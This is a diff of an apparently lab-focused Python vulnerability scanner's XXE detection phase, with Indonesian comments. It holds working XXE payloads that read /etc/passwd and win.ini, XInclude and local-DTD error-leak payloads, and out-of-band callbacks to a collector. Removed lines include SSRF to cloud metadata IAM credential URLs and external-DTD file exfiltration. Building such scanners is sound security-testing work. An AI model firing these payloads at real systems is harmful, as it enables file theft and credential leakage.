+        if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.-]{0,40}", field_name):
+            field_name = "productId"
+        injection_field = field_name if field_name.lower() in {"productid", "storeid"} else "productId"
+        product = f"&{entity_name};" if injection_field.lower() == "productid" else "1"
+        store = f"&{entity_name};" if injection_field.lower() == "storeid" else "1"
+        stock = (
+            '<?xml version="1.0" encoding="UTF-8"?>'
+            f'<!DOCTYPE stockCheck [<!ENTITY {entity_name} SYSTEM "{safe_uri}">]>'
+            f'<stockCheck><productId>{product}</productId><storeId>{store}</storeId></stockCheck>'
+        )
+        generic = (
+            '<?xml version="1.0" encoding="UTF-8"?>'
+            f'<!DOCTYPE root [<!ENTITY {entity_name} SYSTEM "{safe_uri}">]>'
+            f'<root><{injection_field}>&{entity_name};</{injection_field}></root>'
+        )
+        return [stock, generic]
 
-    def _xxe_try_file_entity(self, endpoints: list[str], uris: list[str]) -> tuple[str, str, str, str] | None:
-        """Cari bukti in-band file read pada entitas eksternal; kembalikan (url, uri, marker, sample)."""
-        for url in endpoints:
-            ready, baseline = self._xxe_endpoint_ready(url)
-            if not ready:
-                continue
-            base_text = (baseline.text or "") if baseline else ""
-            for uri in uris:
-                for body in self._xxe_bodies(uri):
-                    if not self._within_budget():
-                        return None
-                    resp = self._xxe_post_xml(url, body)
-                    if resp is None or resp.error or not resp.text:
-                        continue
-                    found = self._xxe_file_marker(resp.text)
-                    if not found:
-                        continue
-                    label, sample = found
-                    if sample and sample in base_text:
-                        continue
-                    if uri.split("/")[-1] and uri.split("/")[-1] in body and sample in body:
-                        continue
-                    return url, uri, label, sample
-        return None
-
-    def _xxe_try_xinclude(self, endpoints: list[str], pages: list[Page]) -> tuple[str, str, str] | None:
-        xinc = ('<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
-                '<xi:include parse="text" href="file:///etc/passwd"/></foo>')
-        xinc_win = ('<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
-                    '<xi:include parse="text" href="file:///c:/windows/win.ini"/></foo>')
-        for url in endpoints:
-            ready, baseline = self._xxe_endpoint_ready(url)
-            if not ready:
-                continue
-            base_text = (baseline.text or "") if baseline else ""
-            # Vektor 1: parameter form yang disisipkan server ke dokumen XML.
-            for payload in (xinc, xinc_win):
-                for data in ({"productId": payload, "storeId": "1"}, {"productId": payload}):
-                    if not self._within_budget():
-                        return None
-                    resp = self._request("POST", url, data=data)
-                    if resp.error or not resp.text:
-                        continue
-                    found = self._xxe_file_marker(resp.text)
-                    if found and not (found[1] in base_text):
-                        return url, "form productId", f"{found[0]}: {found[1]}"
-            # Vektor 2: body XML yang memang berisi XInclude.
-            for payload in (xinc, xinc_win):
-                for body in (
-                    f'<?xml version="1.0"?><stockCheck><productId>{payload}</productId><storeId>1</storeId></stockCheck>',
-                    f'<?xml version="1.0"?><root><value>{payload}</value></root>',
-                ):
-                    if not self._within_budget():
-                        return None
-                    resp = self._xxe_post_xml(url, body)
-                    if resp is None or resp.error or not resp.text:
-                        continue
-                    found = self._xxe_file_marker(resp.text)
-                    if found and found[1] not in base_text:
-                        return url, "XML body XInclude", f"{found[0]}: {found[1]}"
-        return None
-
-    def _xxe_try_svg_upload(self, pages: list[Page]):
-        pu = urlparse(self.target_url)
-        base = f"{pu.scheme}://{pu.netloc}"
-        svg = ('<?xml version="1.0" standalone="yes"?>'
-               '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>'
-               '<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" '
-               'xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">'
-               '<text font-size="16" x="0" y="16">&xxe;</text></svg>')
-        if not self._lab_session_login():
-            return None
-        targets = ["my-account", "account", "profile"]
-        for path in targets:
+    def _xxe_try_file_entity(self, endpoints: list[str], uris: list[str],
+                             point_by_url: dict[str, Point] | None = None) -> tuple[str, str, str, str] | None:
+        """Konfirmasi file read hanya dengan marker OS spesifik dan dua respons."""
+        point_by_url = point_by_url or {}
+        for url in endpoints[:8]:
             if not self._within_budget():
                 return None
-            page_resp = self._request("GET", urljoin(base + "/", path), allow_redirects=True)
-            if page_resp.error or not page_resp.text:
+            point = point_by_url.get(url)
+            ready, baseline = self._xxe_endpoint_ready(url, point)
+            if not ready or baseline is None:
                 continue
-            try:
-                soup = BeautifulSoup(page_resp.text, "html.parser")
-            except Exception:
-                continue
-            for form in soup.find_all("form"):
-                file_inputs = [f for f in form.find_all("input")
-                               if (f.get("type") or "").lower() == "file" and f.get("name")]
-                if not file_inputs:
-                    continue
-                action = urljoin(page_resp.url, form.get("action") or page_resp.url)
-                if not self._same_origin(action) or DESTRUCTIVE_PATH_RE.search(urlparse(action).path or "/"):
-                    continue
-                data_fields: dict[str, str] = {}
-                for fld in form.find_all(["input", "select", "textarea"]):
-                    name = fld.get("name")
-                    if not name or fld.has_attr("disabled"):
-                        continue
-                    typ = (fld.get("type") or "").lower() or fld.name
-                    if typ in {"submit", "button", "image", "reset", "file", "password", "checkbox", "radio"}:
-                        continue
-                    data_fields[name] = str(fld.get("value") or "")[:500]
-                for finput in file_inputs[:2]:
+            base_text = baseline.text or ""
+            for uri in uris:
+                for body in self._xxe_bodies(uri, point, "satria_file"):
                     if not self._within_budget():
                         return None
-                    fname = finput.get("name")
-                    try:
-                        raw = self.session.request(
-                            "POST", action, data=data_fields,
-                            files={fname: ("avatar.svg", svg.encode("utf-8"), "image/svg+xml")},
-                            timeout=self.timeout, allow_redirects=True,
-                        )
-                        self.request_count += 1
-                        self.stats["requests"] = self.request_count
-                        body = raw.text or ""
-                    except Exception:
+                    first = self._xxe_post_xml(url, body)
+                    if first.error or not first.text:
                         continue
-                    if self._xxe_file_marker(body):
-                        return action, str(fname), body
-                    candidates: list[str] = [raw.url]
-                    try:
-                        soup2 = BeautifulSoup(body, "html.parser")
-                        for tag in soup2.find_all(["img", "a", "link", "source"]):
-                            src = tag.get("src") or tag.get("href")
-                            if src:
-                                candidates.append(urljoin(raw.url, src))
-                    except Exception:
-                        pass
-                    for cand in candidates[:6]:
-                        if not self._within_budget():
-                            return None
-                        if not self._same_origin(cand):
-                            continue
-                        r2 = self._request("GET", cand, allow_redirects=True)
-                        if r2.error or not r2.text:
-                            continue
-                        if self._xxe_file_marker(r2.text):
-                            return cand, str(fname), r2.text
+                    found = self._xxe_file_marker(first.text)
+                    if not found or found[1] in base_text:
+                        continue
+                    # Re-send identical probe. A single transient page/error is not enough.
+                    second = self._xxe_post_xml(url, body) if self._within_budget() else None
+                    if second is None or second.error:
+                        continue
+                    found2 = self._xxe_file_marker(second.text or "")
+                    if found2 and found2[0] == found[0] and found2[1] not in base_text:
+                        label, sample = found2
+                        return url, uri, label, sample
         return None
 
-    def phase_xxe(self, pages: list[Page], points: list[Point]) -> None:
-        """Deteksi XXE/XInclude (75-83) dengan probe multi-vektor.
+    def _xxe_try_xinclude(self, endpoints: list[str], pages: list[Page],
+                          point_by_url: dict[str, Point] | None = None) -> tuple[str, str, str] | None:
+        """Tes XInclude hanya pada endpoint/form yang ditemukan saat crawl."""
+        point_by_url = point_by_url or {}
+        payloads = (
+            '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
+            '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/windows/win.ini"/></foo>',
+        )
+        # Vektor form: gunakan action, method, field, dan hidden values yang nyata.
+        for page in pages or []:
+            for form in getattr(page, "forms", []) or []:
+                action = urljoin(page.url, form.action or page.url)
+                if (not self._same_origin(action) or form.has_password
+                        or str(form.method or "GET").upper() != "POST"
+                        or DESTRUCTIVE_PATH_RE.search(urlparse(action).path or "/")):
+                    continue
+                names = [str(name) for name, _value, typ in form.fields
+                         if str(typ).lower() not in {"password", "file", "hidden", "submit", "button"}]
+                chosen = next((n for n in names if n.lower() in {"productid", "storeid", "xml", "payload", "data"}), None)
+                if not chosen:
+                    continue
+                point = Point(
+                    key=f"xxe-xinclude|{urlparse(action).path}|{chosen}", kind="form",
+                    label=f"form `{chosen}`", url=action, name=chosen, original="1",
+                    page_url=page.url, method=str(form.method or "GET").upper(),
+                    fields=tuple(form.fields), interest=6,
+                )
+                for payload in payloads:
+                    if not self._within_budget():
+                        return None
+                    try:
+                        resp = self.send(point, payload)
+                    except Exception:
+                        continue
+                    found = self._xxe_file_marker(resp.text or "")
+                    if resp.error or not found:
+                        continue
+                    confirm = self.send(point, payload) if self._within_budget() else None
+                    found2 = self._xxe_file_marker(confirm.text or "") if confirm and not confirm.error else None
+                    if found2 and found2[0] == found[0]:
+                        return action, f"form:{chosen}", f"{found2[0]}: {found2[1]} (reproduced twice)"
 
-        Konfirmasi hanya dengan bukti kuat: isi file (marker /etc/passwd atau win.ini) pada respons,
-        kredensial metadata internal (SSRF XXE), atau interaksi/nilai exfiltrasi OOB terverifikasi.
-        Endpoint XML divalidasi lebih dulu dan baseline dibandingkan agar tidak false positive.
-        """
+        # Vektor XML body menggunakan bentuk schema stockCheck yang ditemukan.
+        for url in endpoints[:6]:
+            if not self._within_budget():
+                return None
+            point = point_by_url.get(url)
+            ready, baseline = self._xxe_endpoint_ready(url, point)
+            if not ready or baseline is None:
+                continue
+            for payload in payloads:
+                body = (
+                    '<?xml version="1.0" encoding="UTF-8"?>'
+                    f'<stockCheck><productId>{payload}</productId><storeId>1</storeId></stockCheck>'
+                )
+                resp = self._xxe_post_xml(url, body)
+                found = self._xxe_file_marker(resp.text or "")
+                if resp.error or not found or found[1] in (baseline.text or ""):
+                    continue
+                confirm = self._xxe_post_xml(url, body) if self._within_budget() else None
+                found2 = self._xxe_file_marker(confirm.text or "") if confirm and not confirm.error else None
+                if found2 and found2[0] == found[0] and found2[1] not in (baseline.text or ""):
+                    return url, "XML body XInclude", f"{found2[0]}: {found2[1]} (reproduced twice)"
+        return None
+
+    def _xxe_oob_url(self, nonce: str) -> str | None:
+        setup = getattr(self, "oob", None)
+        if not setup:
+            return None
+        if getattr(setup, "kind", "") == "webhook_site":
+            token = str(getattr(setup, "token", "") or "").strip()
+            return f"https://webhook.site/{token}/{nonce}" if token else None
+        domain = str(getattr(setup, "domain", "") or "").strip().strip(".").lower()
+        if not re.fullmatch(r"[a-z0-9.-]+", domain) or "." not in domain:
+            return None
+        return f"http://{nonce}.{domain}/"
+
+    def _xxe_oob_seen(self, result: Any, nonce: str) -> bool:
+        interactions = getattr(result, "interactions", None) if result else None
+        if isinstance(interactions, str):
+            interactions = [interactions]
+        stack = list(interactions or [])
+        while stack:
+            item = stack.pop()
+            if isinstance(item, (list, tuple, set)):
+                stack.extend(item)
+            elif nonce.lower() in str(item).lower():
+                return True
+        return False
+
+    def _xxe_local_dtd_payloads(self) -> list[str]:
+        """Payload error-based untuk DTD lokal populer; marker tetap harus terpantul."""
+        common = (
+            ("/usr/share/yelp/dtd/docbookx.dtd", "ISOamso"),
+            ("/usr/share/yelp/dtd/docbookx.dtd", "ISOgrk1"),
+            ("/usr/share/xml/fontconfig/fonts.dtd", "expr"),
+        )
+        payloads = []
+        for local_path, entity in common:
+            payloads.append(
+                '<?xml version="1.0" encoding="UTF-8"?>'
+                '<!DOCTYPE message ['
+                f'<!ENTITY % local_dtd SYSTEM "file://{local_path}">'
+                f'<!ENTITY % {entity} \'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
+                '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///satria-nonexistent/&#x25;file;&#x27;>">'
+                '&#x25;eval;&#x25;error;\'>%local_dtd;]>'
+                '<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'
+            )
+        return payloads
+
+    def phase_xxe(self, pages: list[Page], points: list[Point]) -> None:
+        """XXE/XInclude: bukti spesifik, endpoint discovery-driven, dan OOB nonce."""
         if not self._within_budget():
             return
-        endpoints = self._xxe_endpoints(pages)
+        endpoints = self._xxe_endpoints(pages, points)
+        if not endpoints:
+            self.stats.setdefault("xxe_notes", []).append("Tidak ada endpoint XML/SOAP yang terbukti dari form, JS, header, atau point discovery.")
+            return
 
-        def mark(num: int, url: str, kind: str, name: str, ev: str, method_name: str,
-                 method: str = "POST", fields=None):
-            point = Point(key=f"xxe-{num}", kind=kind, label=f"endpoint {url}", url=url,
-                          name=name, original="", page_url=url, method=method,
-                          fields=tuple(fields) if fields else (), interest=6)
+        point_by_url: dict[str, Point] = {}
+        for point in points or []:
+            if getattr(point, "kind", "") == "xml" and self._same_origin(point.url):
+                point_by_url.setdefault(canonical_url(point.url), point)
+
+        ready_endpoints: list[str] = []
+        baseline_by_url: dict[str, Response] = {}
+        for url in endpoints:
+            if not self._within_budget():
+                break
+            ready, baseline = self._xxe_endpoint_ready(url, point_by_url.get(url))
+            if ready and baseline is not None:
+                ready_endpoints.append(url)
+                baseline_by_url[url] = baseline
+        if not ready_endpoints:
+            self.stats.setdefault("xxe_notes", []).append("Endpoint kandidat tidak lolos baseline XML benign stabil 2xx; XXE tidak diklaim.")
+            return
+
+        def mark(num: int, url: str, ev: str, method_name: str, name: str = "xml_body") -> None:
+            point = Point(
+                key=f"xxe-{num}", kind="xml", label=f"endpoint XML {url}",
+                url=url, name=name, original="", page_url=url, method="POST", interest=8,
+            )
             self._mark(num, point, ev, method_name)
 
-        # --- 75: external entity membaca file (in-band) ---
+        # 75: external general entity in-band. Response must contain a real OS file line,
+        # absent from baseline and reproduced twice.
         if 75 not in self._confirmed and self._within_budget():
-            hit = self._xxe_try_file_entity(endpoints, ["file:///etc/passwd", "file:///c:/windows/win.ini"])
+            hit = self._xxe_try_file_entity(
+                ready_endpoints,
+                ("file:///etc/passwd", "file:///c:/windows/win.ini"),
+                point_by_url,
+            )
             if hit:
                 url, uri, label, sample = hit
-                mark(75, url, "xml", "body",
-                     f"Entitas eksternal XXE terverifikasi: respons memuat isi file {uri} ({label}: {snippet(sample, 80)!r}) "
-                     f"setelah payload dikirim ke {url}; marker tidak ada pada baseline benign.",
-                     "xxe_external_entity_file_read")
+                mark(75, url,
+                     f"External entity XXE membaca file terkonfirmasi dua kali: {uri} menghasilkan "
+                     f"{label} ({snippet(sample, 120)!r}); marker tidak ada pada baseline benign.",
+                     "xxe_external_entity_repeated_file_marker")
 
-        # --- 81: XInclude membaca file (parameter form & body XML) ---
+        # 81: XInclude pada form atau XML body yang benar-benar ditemukan.
         if 81 not in self._confirmed and self._within_budget():
-            hit = self._xxe_try_xinclude(endpoints, pages)
+            hit = self._xxe_try_xinclude(ready_endpoints, pages, point_by_url)
             if hit:
                 url, vector, proof = hit
-                mark(81, url, "xml", "body",
-                     f"XInclude terverifikasi ({vector}): respons memuat isi file lokal melalui xi:include pada {url} "
-                     f"({proof}). Bukti in-band kuat.",
-                     "xxe_xinclude_file_read")
+                mark(81, url,
+                     f"XInclude file inclusion terkonfirmasi pada {vector}: respons memuat "
+                     f"{proof}; endpoint sama-origin dan baseline XML berhasil.",
+                     "xxe_xinclude_file_marker")
 
-        # --- 80: blind XXE via pesan error ---
-        if 80 not in self._confirmed and self._within_budget():
-            payloads = [
-                ('<?xml version="1.0" encoding="UTF-8"?>'
-                 '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
-                 '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'),
-                ('<?xml version="1.0" encoding="UTF-8"?>'
-                 '<!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd">'
-                 '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'file:///invalid/%file;\'>">'
-                 '%eval;%exfil; ]><foo>bar</foo>'),
-            ]
-            for url in endpoints:
-                if 80 in self._confirmed or not self._within_budget():
-                    break
-                ready, baseline = self._xxe_endpoint_ready(url)
-                if not ready:
-                    continue
-                base_text = (baseline.text or "") if baseline else ""
-                for body in payloads:
-                    resp = self._xxe_post_xml(url, body)
-                    if resp is None or resp.error or not resp.text:
-                        continue
-                    found = self._xxe_file_marker(resp.text)
-                    if not found or found[1] in base_text:
-                        continue
-                    label, sample = found
-                    mark(80, url, "xml", "body",
-                         f"Kebocoran via pesan error XXE terverifikasi di {url}: respons memuat isi file "
-                         f"({label}: {snippet(sample, 80)!r}) setelah payload pemicu error.",
-                         "xxe_blind_error_message_leak")
-                    break
+        # 80: Error-message XXE yang membutuhkan malicious external DTD yang
+        # di-host operator tidak dijalankan tanpa URL/isi DTD terverifikasi.
+        # Tidak memakai ulang payload local-DTD (#83), supaya satu bukti tidak
+        # salah diklasifikasikan sebagai dua kelas lab.
 
-        # --- 83: repurposing local DTD ---
+        # 83: local DTD repurposing. Konfirmasi hanya bila payload dari DTD lokal yang
+        # dikenal menghasilkan file marker dalam pesan error berulang.
         if 83 not in self._confirmed and self._within_budget():
-            payloads = [
-                ('<?xml version="1.0" encoding="UTF-8"?>'
-                 '<!DOCTYPE message ['
-                 '<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">'
-                 '<!ENTITY % ISOamso \''
-                 '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
-                 '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'
-                 '&#x25;eval;'
-                 '&#x25;error;'
-                 '\'>'
-                 '%local_dtd;'
-                 ']><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'),
-                ('<?xml version="1.0" encoding="UTF-8"?>'
-                 '<!DOCTYPE message ['
-                 '<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">'
-                 '<!ENTITY % ISOgrk1 \''
-                 '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
-                 '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'
-                 '&#x25;eval;'
-                 '&#x25;error;'
-                 '\'>'
-                 '%local_dtd;'
-                 ']><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'),
-                ('<?xml version="1.0" encoding="UTF-8"?>'
-                 '<!DOCTYPE message ['
-                 '<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">'
-                 '<!ENTITY % expr \''
-                 '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
-                 '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'
-                 '&#x25;eval;'
-                 '&#x25;error;'
-                 '\'>'
-                 '%local_dtd;'
-                 ']><foo>1</foo>'),
-            ]
-            for url in endpoints:
+            for url in ready_endpoints[:5]:
                 if 83 in self._confirmed or not self._within_budget():
                     break
-                ready, baseline = self._xxe_endpoint_ready(url)
-                if not ready:
-                    continue
-                base_text = (baseline.text or "") if baseline else ""
-                for body in payloads:
+                baseline_text = baseline_by_url[url].text or ""
+                for body in self._xxe_local_dtd_payloads():
                     resp = self._xxe_post_xml(url, body)
-                    if resp is None or resp.error or not resp.text:
+                    found = self._xxe_file_marker(resp.text or "") if not resp.error else None
+                    if not found or found[1] in baseline_text or not error_signatures.search(resp.text or ""):
                         continue
-                    found = self._xxe_file_marker(resp.text)
-                    if not found or found[1] in base_text:
-                        continue
-                    label, sample = found
-                    mark(83, url, "xml", "body",
-                         f"Repurposing local DTD terverifikasi di {url}: redefinisi entitas pada DTD lokal memicu "
-                         f"kebocoran file ({label}: {snippet(sample, 80)!r}).",
-                         "xxe_repurpose_local_dtd")
-                    break
-
-        # --- 76: XXE ke SSRF (metadata internal in-band, atau interaksi OOB) ---
-        if 76 not in self._confirmed and self._within_budget():
-            for url in endpoints:
-                if 76 in self._confirmed or not self._within_budget():
-                    break
-                ready, baseline = self._xxe_endpoint_ready(url)
-                if not ready:
-                    continue
-                base_text = (baseline.text or "") if baseline else ""
-                internal_uris = (
-                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/",
-                    "http://169.254.169.254/latest/meta-data/",
-                    "http://169.254.169.254/latest/dynamic/instance-identity/document",
-                )
-                for uri in internal_uris:
-                    if 76 in self._confirmed or not self._within_budget():
-                        break
-                    for body in self._xxe_bodies(uri):
-                        resp = self._xxe_post_xml(url, body)
-                        if resp is None or resp.error or not resp.text:
-                            continue
-                        found = self._xxe_metadata_marker(resp.text)
-                        if not found or found[1] in base_text:
-                            continue
-                        label, sample = found
-                        mark(76, url, "xml", "body",
-                             f"XXE SSRF terverifikasi di {url}: parser mengambil URL internal {uri} dan respons "
-                             f"memuat data internal ({label}: {snippet(sample, 100)!r}).",
-                             "xxe_ssrf_internal_metadata")
+                    confirm = self._xxe_post_xml(url, body) if self._within_budget() else None
+                    found2 = self._xxe_file_marker(confirm.text or "") if confirm and not confirm.error else None
+                    if found2 and found2[0] == found[0] and error_signatures.search(confirm.text or ""):
+                        mark(83, url,
+                             f"Local DTD repurposing terkonfirmasi dua kali dengan marker file "
+                             f"{found2[0]} ({snippet(found2[1], 100)!r}) pada error parser.",
+                             "xxe_local_dtd_repurpose_repeated")
                         break
 
-        # --- 77/78/79: blind XXE via OOB (interaksi/nilai exfil terverifikasi) ---
-        if self.oob and getattr(self.oob, "domain", None):
-            oob_domain = self.oob.domain
-            oob_token = getattr(self.oob, "token", "") or ""
-
-            def _oob_url(tag: str) -> str:
-                host = f"{oob_token}.{tag}.{oob_domain}".strip(".")
-                return f"http://{host}/"
-
-            def _poll():
+        # 77: blind XXE via ordinary external general entity. Only the exact nonce
+        # on the configured operator-controlled OOB collector counts.
+        if (self.oob and getattr(self.oob, "poll_url", None)
+                and 77 not in self._confirmed and self._within_budget()):
+            for url in ready_endpoints[:1]:
+                if 77 in self._confirmed or not self._within_budget():
+                    break
+                nonce = "xxe77" + uuid.uuid4().hex[:12]
+                callback = self._xxe_oob_url(nonce)
+                if not callback:
+                    break
+                body = self._xxe_bodies(callback, point_by_url.get(url), "satria_oob")[0]
+                self._xxe_post_xml(url, body)
                 try:
-                    return self._poll_oob()
+                    result = self._poll_oob()
                 except Exception:
-                    return None
+                    result = None
+                if self._xxe_oob_seen(result, nonce):
+                    mark(77, url,
+                         f"Blind XXE external general entity memicu interaksi OOB dengan nonce unik "
+                         f"{nonce}; interaksi tercatat pada poller yang dikonfigurasi operator.",
+                         "xxe_blind_external_entity_unique_oob")
+                    break
 
-            if 77 not in self._confirmed and self._within_budget():
-                uri = _oob_url(f"xxe77{uuid.uuid4().hex[:4]}")
-                for url in endpoints[:5]:
-                    if 77 in self._confirmed or not self._within_budget():
-                        break
-                    for body in self._xxe_bodies(uri):
-                        self._xxe_post_xml(url, body)
-                        got = _poll()
-                        if got and getattr(got, "interactions", None):
-                            mark(77, url, "xml", "body",
-                                 f"Interaksi OOB terverifikasi (external entity) ke {uri} setelah payload XXE "
-                                 f"dikirim ke {url}. Bukti blind XXE out-of-band.",
-                                 "xxe_blind_oob_interaction")
-                            break
+        # 78: external parameter entity, diuji terpisah dengan nonce berbeda.
+        if (self.oob and getattr(self.oob, "poll_url", None)
+                and 78 not in self._confirmed and self._within_budget()):
+            for url in ready_endpoints[:1]:
+                if 78 in self._confirmed or not self._within_budget():
+                    break
+                nonce = "xxe78" + uuid.uuid4().hex[:12]
+                callback = self._xxe_oob_url(nonce)
+                if not callback:
+                    break
+                body = (
+                    '<?xml version="1.0" encoding="UTF-8"?>'
+                    f'<!DOCTYPE stockCheck [<!ENTITY % satria SYSTEM "{html_module.escape(callback, quote=True)}">%satria;]>'
+                    '<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'
+                )
+                self._xxe_post_xml(url, body)
+                try:
+                    result = self._poll_oob()
+                except Exception:
+                    result = None
+                if self._xxe_oob_seen(result, nonce):
+                    mark(78, url,
+                         f"Blind XXE parameter entity (%satria) memicu OOB dengan nonce unik {nonce}; "
+                         f"interaksi cocok persis dengan probe ini.",
+                         "xxe_blind_parameter_entity_unique_oob")
+                    break
 
-            if 78 not in self._confirmed and self._within_budget():
-                uri = _oob_url(f"xxe78{uuid.uuid4().hex[:4]}")
-                for url in endpoints[:5]:
-                    if 78 in self._confirmed or not self._within_budget():
-                        break
-                    for body in (
-                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{uri}"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>',
-                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{uri}"> %xxe; ]><foo>1</foo>',
-                    ):
-                        self._xxe_post_xml(url, body)
-                        got = _poll()
-                        if got and getattr(got, "interactions", None):
-                            mark(78, url, "xml", "body",
-                                 f"Interaksi OOB terverifikasi via parameter entity (%xxe;) ke {uri} setelah payload "
-                                 f"dikirim ke {url}. Bukti blind XXE out-of-band.",
-                                 "xxe_blind_oob_parameter_entity")
-                            break
+        # 76 (SSRF ke layanan internal), 79 (exfiltrasi file via DTD), 82 (SVG upload),
+        # dan data retrieval dari DTD lokal yang tidak ada pada OS target tidak dipancing
+        # secara agresif: akan memerlukan akses metadata/jaringan internal, transfer data,
+        # atau upload persisten. Tidak ada klaim tanpa bukti tersebut.
 
-            if 79 not in self._confirmed and self._within_budget():
-                uri = _oob_url(f"xxe79{uuid.uuid4().hex[:4]}")
-                for url in endpoints[:5]:
-                    if 79 in self._confirmed or not self._within_budget():
-                        break
-                    for body in (
-                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "{uri}"> %dtd; ]><foo>1</foo>',
-                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{uri}"> %xxe; ]><foo>1</foo>',
-                    ):
-                        self._xxe_post_xml(url, body)
-                        got = _poll()
-                        vals = getattr(got, "values", None) if got else None
-                        if not vals:
-                            continue
-                        val = vals[0] if isinstance(vals, (list, tuple)) else vals
-                        mark(79, url, "xml", "body",
-                             f"Exfiltrasi data OOB terverifikasi (nilai tertangkap: {snippet(str(val), 120)}) setelah "
-                             f"payload XXE dengan external DTD dikirim ke {url}.",
-                             "xxe_blind_oob_exfil_dtd")
-                        break
-
-        # --- 82: XXE via upload gambar SVG ---
-        if 82 not in self._confirmed and self._within_budget():
-            hit = self._xxe_try_svg_upload(pages)
-            if hit:
-                url, field, body = hit
-                found = self._xxe_file_marker(body)
-                proof = f"{found[0]}: {snippet(found[1], 60)!r}" if found else "isi file"
-                mark(82, url, "upload", field,
-                     f"XXE via upload gambar terverifikasi: SVG ber-payload XXE diunggah melalui field '{field}' dan "
-                     f"respons/resource hasil upload ({url}) memuat isi file lokal ({proof}).",
-                     "xxe_image_upload_file_read")
 
     def report(self) -> dict[str, Any]:
         labs = []
